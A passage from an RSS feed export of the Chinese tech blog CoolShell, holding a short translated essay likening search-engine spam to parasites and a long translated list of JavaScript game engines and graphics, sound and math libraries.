<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/9508.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9508.html" class="wp_rp_title">PFIF网上寻人协议</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4905.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4905.html" class="wp_rp_title">语言的数据亲和力</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3609.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3609.html" class="wp_rp_title">那些炒作过度的技术和概念</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3585.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3585.html" class="wp_rp_title">SOAP的S是Simple</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2504.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2504.html" class="wp_rp_title">信XML，得永生！</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3498" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="2100eaf52b">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>7</strong> 人打了分，平均分： <strong>3.71</strong> )<br><span class="post-ratings-text" id="ratings_3498_text"></span><meta itemprop="name" content="信XML，得自信">
<meta itemprop="headline" content="信XML，得自信">
<meta itemprop="description" content="XML可能是计算有史以来最NB的发明了，以至于我们以没有XML的程序是难登大堂的程序，不用XML，你都不好意思当程序员。于是，我们看到了很多很雷人的用法（《信XML，得永生》），当然一些朋友当时并没有看懂，不过我不怪大家，因为我们依然深信使用XML可以让你有强大的Zhuangbility，于是我们有下面这两种相当Geiliable的用法。
一、XML中的XML
这个例子是某公司的一个SOAP实...">
<meta itemprop="datePublished" content="2011-01-19T08:49:48+08:00">
<meta itemprop="dateModified" content="2011-01-16T22:35:10+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3498.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3498.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.71">
<meta itemprop="ratingCount" content="7">
</div>
</div>
<div id="post-ratings-3498-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-19T08:49:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/3498.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Google 需要性爱 ]]></title>
<link>https://coolshell.cn/articles/3510.html</link>
<content><![CDATA[ 
<p>看到一篇趣文<a href="https://krugman.blogs.nytimes.com/2011/01/10/google-needs-sex/" target="_blank">Google Needs Sex</a>，翻译过来。</p>
<p>Brad DeLong 给我们写了 <a href="http://delong.typepad.com/sdj/2011/01/trouble-in-the-house-of-google.html">两篇关于“Google遇到的麻烦”的文章</a>(墙)，这两篇文章基本上是说， 制造网络欺诈和网络垃圾信息的人会尽其一切努力来和搜索引擎进行博弈，这样一来，其会让搜索到的结果对我们越来越没有帮助（译注：百度的竞价排名成为了制造网络欺诈和网络垃圾信息甚至洗脑的温床）。于是，人们开始去使用其它一些影响地较少的搜索引擎，准确的说，是那些垃圾信息和欺诈信息的东西还不适应于这些搜索引擎。</p>
<p>这让我想到了Sex。</p>
<p>如果你查看一下进化论，你就会知道为什么有性繁殖是有进化性的，是有可持续性的，而进化也是需要巨大的成本的。</p>
<p>为什么自然界不用克隆来繁殖呢？我所理解的最有说服力的答案是—— <a href="https://www.sciencedaily.com/releases/2009/07/090706171542.htm">防御寄生生物</a>。如果每一代的生物体都和上一代完全的一样，寄生生物就总有一天可以破解生物体的防御，就是为什么！如果我们的某个香蕉园里种植着“克隆香焦” ，那么一旦某种病菌传播开来，那么我们整个香蕉园里的全部香蕉将毁于一旦。所以，混杂基因的模式会让寄生生物或病毒更难破坏我们的防御。</p>
<p>因此，Google的这些欺诈信息和垃圾信息就像是寄生在人体上的寄生体一样，它们已经非常适应Google的搜索引擎。（译注：百度上的寄生体则像是百度自己养的宠物）</p>
<p>我不知道“搜索引擎的性爱”会是什么样的，但是很明显，Google需要一些。</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9508.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9508.html" class="wp_rp_title">PFIF网上寻人协议</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5815.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_title">来信， 创业 和 移动互联网</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5701.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5701.html" class="wp_rp_title">SteveY对Amazon和Google平台的吐槽</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5224.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_title">一些文章和各种资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3806.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3806.html" class="wp_rp_title">Google图片搜索下的的C String</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3510" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="413707a212">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>13</strong> 人打了分，平均分： <strong>3.77</strong> )<br><span class="post-ratings-text" id="ratings_3510_text"></span><meta itemprop="name" content="Google 需要性爱">
<meta itemprop="headline" content="Google 需要性爱">
<meta itemprop="description" content="看到一篇趣文Google Needs Sex，翻译过来。

Brad DeLong 给我们写了 两篇关于“Google遇到的麻烦”的文章(墙)，这两篇文章基本上是说， 制造网络欺诈和网络垃圾信息的人会尽其一切努力来和搜索引擎进行博弈，这样一来，其会让搜索到的结果对我们越来越没有帮助（译注：百度的竞价排名成为了制造网络欺诈和网络垃圾信息甚至洗脑的温床）。于是，人们开始去使用其它一些影响地较少的搜...">
<meta itemprop="datePublished" content="2011-01-19T12:43:00+08:00">
<meta itemprop="dateModified" content="2011-01-17T20:46:54+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3510.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3510.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.77">
<meta itemprop="ratingCount" content="13">
</div>
</div>
<div id="post-ratings-3510-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-19T12:43:00+08:00</pubDate>
<guid>https://coolshell.cn/articles/3510.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ JS游戏引擎列表 ]]></title>
<link>https://coolshell.cn/articles/3516.html</link>
<content><![CDATA[ 
<p>这里有一个<a href="https://gist.github.com/768272" target="_blank">网址</a>收集了关于JS游戏引擎开发库的一个列表，转过来。关于使用JS和HTML5做的一些小游戏，可参见《<a rel="bookmark" href="https://coolshell.cn/articles/2998.html" target="_blank">HTML5 小游戏展示</a>》</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E" title="游戏引擎">游戏引擎</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#3D_%E5%BC%95%E6%93%8E" title="3D 引擎">3D 引擎</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%A2%B0%E6%92%9E%E6%A3%80%E6%B5%8B" title="碰撞检测">碰撞检测</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8A%A8%E7%94%BB" title="动画">动画</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%A3%B0%E9%9F%B3" title="声音">声音</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%9B%BE%E5%BD%A2" title="图形">图形</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Math" title="Math">Math</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E"></span>游戏引擎<span class="ez-toc-section-end"></span>
</h4>
<table>
<tbody>
<tr>
<th align="left">Name</th>
<th align="left">Latest Release</th>
<th align="left">License</th>
<th align="left">Type</th>
<th align="left">Notes</th>
</tr>
<tr>
<td align="left"><a href="http://renderengine.com/">The Render Engine</a></td>
<td align="left">1.5.3</td>
<td align="left">MIT</td>
<td align="left"></td>
<td align="left">跨浏览器; 大规模 API; 开源. <a href="http://renderengine.com/features.php">2</a>
</td>
</tr>
<tr>
<td align="left"><a href="http://gamequery.onaluf.org/">gameQuery</a></td>
<td align="left">0.5.1</td>
<td align="left">CC BY-SA 2.5</td>
<td align="left"></td>
<td align="left">和 jQuery 一起使用</td>
</tr>
<tr>
<td align="left"><a href="http://game.tyler-dewitt.com/">gTile</a></td>
<td align="left">0.0.1</td>
<td align="left"></td>
<td align="left">Tile based</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.kesiev.com/akihabara/">Akihabara</a></td>
<td align="left">1.3</td>
<td align="left">GPL2/MIT</td>
<td align="left">Classic Repro</td>
<td align="left">基于JS+HTML5的街机风格的游戏 <a href="https://github.com/kesiev/akihabara">3</a>
</td>
</tr>
<tr>
<td align="left"><a href="http://www.lukewallin.co.uk/?go=engine">The Javascript 2D Game Engine</a></td>
<td align="left"></td>
<td align="left">GPL</td>
<td align="left"></td>
<td align="left">注重于重力、物理、碰撞检测方面，使用HTML5 Canvas 和IE的ExplorerCanvas 低CPU消耗. <a href="http://www.lukewallin.co.uk/?go=engine">4</a>
</td>
</tr>
<tr>
<td align="left"><a href="http://gogomakeplay.com/gmp">The GMP Javascript Game Engine</a></td>
<td align="left">1.7.4 (2010-10-31)</td>
<td align="left">GPL2/MIT</td>
<td align="left"></td>
<td align="left">注重于数度的操作简化，”easy to learn and use” <a href="http://gogomakeplay.com/gmp">5</a>
</td>
</tr>
<tr>
<td align="left"><a href="http://craftyjs.com/">Crafty</a></td>
<td align="left">0.1</td>
<td align="left">GPL/MIT</td>
<td align="left"></td>
<td align="left">轻量级和模块化。 <a href="http://craftyjs.com/">6</a>
</td>
</tr>
<tr>
<td align="left"><a href="http://www.effectgames.com/effect/">Effect Games</a></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.propulsionjs.com/">PropulsionJS</a></td>
<td align="left">1.1</td>
<td align="left">MIT</td>
<td align="left"></td>
<td align="left">使用 HTML5 Canvas. <a href="http://www.propulsionjs.com/">7</a>
</td>
</tr>
<tr>
<td align="left"><a href="http://flax.ie/category/flax-game-engine/">Flax</a></td>
<td align="left"></td>
<td align="left">Apache 2.0</td>
<td align="left"></td>
<td align="left">还没有released。使用 GWT 和 HTML5。关注于Linux和Mac OS上的Web游戏开发。<a href="http://flax.ie/about/">8</a>
</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/giancarlo/j5g3">j5g3</a></td>
<td align="left"></td>
<td align="left">GPLv3</td>
<td align="left"></td>
<td align="left">还在开发过程中</td>
</tr>
<tr>
<td align="left"><a href="https://sites.google.com/site/cssgameengine/">cssgameengine</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">用于初学者。</td>
</tr>
</tbody>
</table>
<p><span id="more-3516"></span></p>
<table>
<tbody>
<tr>
<td align="left"><a href="http://mccormick.cx/projects/jsGameSoup/">jsGameSoup</a></td>
<td align="left">v74</td>
<td align="left">LGPLv3</td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.sean.co.uk/a/webdesign/javascript_gamelib/javascript_gamelib.shtm">Javascript Gamelib</a></td>
<td align="left">2.10</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.sarien.net/source">Sarien.net interpreter</a></td>
<td align="left"></td>
<td align="left">GPL</td>
<td align="left">2D Adventure</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://code.google.com/p/jgen/">jGen</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">Isometric</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.isogenicengine.com/home/">Isogenic Engine</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">Isometric</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://gammajs.org/">GammaJS</a></td>
<td align="left">1.0</td>
<td align="left">MIT</td>
<td align="left">2.5D Platform</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.codeproject.com/KB/scripting/TomsHallsJavascriptGame.aspx">Tom’s Halls</a></td>
<td align="left">3.0</td>
<td align="left"></td>
<td align="left">Platform</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/lostdecade/diggy">Diggy</a></td>
<td align="left"></td>
<td align="left">BSD</td>
<td align="left"></td>
<td align="left">基于 DHTML, 正在暂停中</td>
</tr>
<tr>
<td align="left"><a href="http://impactjs.com/">Impact</a></td>
<td align="left"></td>
<td align="left">Commercial ($99)</td>
<td align="left">2D</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://rocketpack.fi/engine/">Rocket Engine</a></td>
<td align="left"></td>
<td align="left">Commercial</td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.wonderlandblog.com/wonderland/2010/04/aves-an-html-javascript-game-engine.html">Aves</a></td>
<td align="left"></td>
<td align="left">Commercial?</td>
<td align="left"></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/vonkow/Rosewood">Rosewood</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">2D</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/RyanWilliams/cocos2d-javascript">Cocos2D</a></td>
<td align="left"></td>
<td align="left">BSD</td>
<td align="left">2D</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://gamejs.org/">GameJS</a></td>
<td align="left"></td>
<td align="left">MIT</td>
<td align="left">2D</td>
<td align="left">CommonJs; 可以和 RingoJs server 整合，很像 PyGame; 仅支持Canvas;</td>
</tr>
<tr>
<td align="left"><a href="http://www.getxc.org/">xc.js</a></td>
<td align="left"></td>
<td align="left">BSD</td>
<td align="left">2D</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://code.google.com/p/vegalib/">vegalib</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">LPGL</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://sourceforge.net/projects/clanfx/">ClanFX</a></td>
<td align="left">0.0.1</td>
<td align="left"></td>
<td align="left">Tile based</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://canvex.lazyilluminati.com/">Canvex</a></td>
<td align="left"></td>
<td align="left">FPS</td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/Osmose/bdge">bdge</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"><a href="https://github.com/Osmose/Sub-C-Adventure">Demo</a></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/mcgrue/js-verge">js-verge</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">2D</td>
<td align="left"><a href="http://spriteright.com/">Demo</a></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/BillyWM/FlixelJS">FlixelJS</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">2D</td>
<td align="left">
<a href="https://billy.wenge-murphy.com/flixel-js/testgame.html">Demo</a> Port of Flixel (Flash) to JS. <a href="http://flixel.org/forums/index.php?topic=2859.0">Announcement thread</a>.</td>
</tr>
<tr>
<td align="left"><a href="https://unity3d.com/">Unity3D</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">Commercial (free version too)</td>
<td align="left">JS backend</td>
</tr>
</tbody>
</table>
<h4>
<span class="ez-toc-section" id="3D_%E5%BC%95%E6%93%8E"></span>3D 引擎<span class="ez-toc-section-end"></span>
</h4>
<p>相比起成熟的游戏引擎来说，这些引擎没有包括诸如AI、声音、游戏逻辑、网络等等功能，不过，你可以使用别的一些JS库来辅助完成这些功能。</p>
<table>
<tbody>
<tr>
<th align="left">Name</th>
<th align="left">Latest Release</th>
<th align="left">License</th>
<th align="left">Notes</th>
</tr>
<tr>
<td align="left"><a href="https://deanm.github.com/pre3d/">Pre3d</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"><a href="https://www.chromeexperiments.com/detail/monster/">Demo</a></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/mrdoob/three.js">three.js</a></td>
<td align="left"></td>
<td align="left">MIT</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.c3dl.org/">C3DL</a></td>
<td align="left">2.1 (?)</td>
<td align="left">MIT</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.ambiera.com/copperlicht/">CopperLicht</a></td>
<td align="left">1.3.2 (?)</td>
<td align="left"></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.wxs.ca/js3d/">JS3D</a></td>
<td align="left">0.1a (2007-02-05)</td>
<td align="left">GPL</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.flashsandy.org/">Sandy 3D</a></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">由Haxe编辑成 JS</td>
</tr>
<tr>
<td align="left"><a href="https://code.google.com/p/o3d/">O3D</a></td>
<td align="left"></td>
<td>BSD</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://www.glge.org/">GLGE</a></td>
<td align="left">0.5.2</td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://spidergl.org/">SpiderGL</a></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h4>
<span class="ez-toc-section" id="%E7%A2%B0%E6%92%9E%E6%A3%80%E6%B5%8B"></span>碰撞检测<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="https://code.google.com/p/box2dweb/">http://code.google.com/p/box2dweb/</a> – 由 <a href="http://www.box2d.org/">Box2D</a> 移植成 JS</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%8A%A8%E7%94%BB"></span>动画<span class="ez-toc-section-end"></span>
</h4>
<table>
<tbody>
<tr>
<th align="left">Name</th>
<th align="left">Latest Release</th>
<th align="left">License</th>
<th align="left">Notes</th>
</tr>
<tr>
<td align="left"><a href="https://github.com/batiste/sprite.js">sprite.js</a></td>
<td align="left"></td>
<td align="left"><a href="https://github.com/batiste/sprite.js/blob/master/LICENSE">VIEW</a></td>
<td align="left">Created with goal of having common JS framework for dsktop and web. <a href="http://www.htmlgoodies.com/daily_news/article.php/417990">1</a>
</td>
</tr>
</tbody>
</table>
<h4>
<span class="ez-toc-section" id="%E5%A3%B0%E9%9F%B3"></span>声音<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="http://www.schillmania.com/projects/soundmanager2/">SoundManager2</a></li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%9B%BE%E5%BD%A2"></span>图形<span class="ez-toc-section-end"></span>
</h4>
<h3>Canvas</h3>
<table>
<tbody>
<tr>
<th align="left">Name</th>
<th align="left">Size (KB)</th>
<th align="left">License</th>
<th align="left">IE</th>
<th align="left">SVG</th>
<th align="left">Docs</th>
<th align="left">Notes</th>
</tr>
<tr>
<td align="left"><a href="https://code.google.com/p/canto-js/">canto.js</a></td>
<td align="left">56</td>
<td align="left"></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/kangax/fabric.js/">fabric.js</a></td>
<td align="left">97</td>
<td align="left"></td>
<td align="left">yes</td>
<td align="left">yes</td>
<td align="left">yes</td>
<td align="left"><a href="https://kangax.github.com/fabric.js/test/demo/">Demo</a></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/rsandor/gury/blob/master/gury.js">gury.js</a></td>
<td align="left">10</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">yes</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://code.google.com/p/cakejs/">CAKE</a></td>
<td align="left">211</td>
<td align="left"></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="http://forvar.de/js/mcl/">Mootools Canvas Library (MCL)</a></td>
<td align="left">8</td>
<td align="left"></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://canvastoolkit.codeplex.com/">HTML5 Canvas Library</a></td>
<td align="left">12</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://code.google.com/p/layered-canvas-library/">Layered Canvas Library (LCL)</a></td>
<td align="left">21</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/davidbrooks/Artisan">Artisan.js</a></td>
<td align="left">17</td>
<td align="left"></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://code.google.com/p/canvg/">canvg</a></td>
<td align="left">78.3</td>
<td align="left"></td>
<td align="left"></td>
<td align="left">yes</td>
<td align="left">no</td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/F1LT3R/burst">burst</a></td>
<td align="left">56</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">yes</td>
<td align="left">没有维护了</td>
</tr>
<tr>
<td align="left"><a href="http://easeljs.com/">easel.js</a></td>
<td align="left">33</td>
<td align="left">MIT</td>
<td align="left">no</td>
<td align="left">no</td>
<td align="left">yes</td>
<td align="left">尝试像Flash的DisplayList 一样在 Canvas 上创建图形。</td>
</tr>
<tr>
<td align="left"><a href="http://processingjs.org/">processing.js</a></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/hapticdata/toxiclibsjs">toxiclibsjs</a></td>
<td align="left"></td>
<td align="left">LPGL2.1</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">和 processing.js 结合和很好</td>
</tr>
<tr>
<td align="left"><a href="https://github.com/hyperandroid/CAAT/">CAAT</a></td>
<td align="left"></td>
<td align="left">MIT</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/michael/unveil">Unveil.js</a></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="left"><a href="https://github.com/biilly/doodle-js">doodle.js</a></td>
<td align="left"></td>
<td align="left">BSD</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>注意，文件尺寸比较并不一定准确，因为有些lib并没有压缩过。</p>
<ul>
<li>
<a href="http://www.quasimondo.com/StackBlurForCanvas/StackBlurDemo.html">Stackblur</a> – 在 Canvas 上实现模糊的效果</li>
<li>
<a href="http://www.pixastic.com/">Pixastic</a> – 简单的图片操作</li>
<li>
<a href="http://raphaeljs.com/">Raphaël</a> – 进行一些矢量图以及一些变化操作，能看<a href="https://coolshell.cn/articles/3107.html" target="_blank">这篇文章</a>
</li>
<li>
<a href="https://github.com/meltingice/CamanJS">CamanJS</a> – Canvas上的一些滤镜</li>
<li>
<a href="https://github.com/millermedeiros/CanvasContext2DWrapper">CanvasContext2DWrapper</a> – Method chaining for Canvas</li>
</ul>
<h3>WebGL</h3>
<ul>
<li>
<a href="https://github.com/onegeek/webglu">WebGLU</a> – WebGL helpers</li>
</ul>
<h3>Color</h3>
<ul>
<li>
<a href="https://github.com/eligrey/color.js">color.js</a> – 颜色管理工具。 MIT</li>
</ul>
<h4>
<span class="ez-toc-section" id="Math"></span>Math<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://sylvester.jcoglan.com/">Sylvester</a> – 数组和矩阵</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://www.playmycode.com/">PlayMyCode</a> – 在线游戏社区。使用 Quby (像Ruby) 编译成JavaScript.</li>
<li>
<a href="http://www.spheredev.org/">Sphere RPG Engine</a> – 为 RPG 游戏设计。使用 JavaScript</li>
<li>
<a href="http://playtomic.com/">playtomic</a> – Commercial service providing analytics, leaderboards etc. services for games. Provides HTML5/JS API in addition to AS2/AS3 ones.</li>
</ul>
<p>(全文完)</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/5537.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5537.html" class="wp_rp_title">一些文章资源和趣闻</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4795.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_title">开源中最好的Web开发的资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3903.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3903.html" class="wp_rp_title">一些有意思的贴子和工具</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3516" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="edddf63e83">
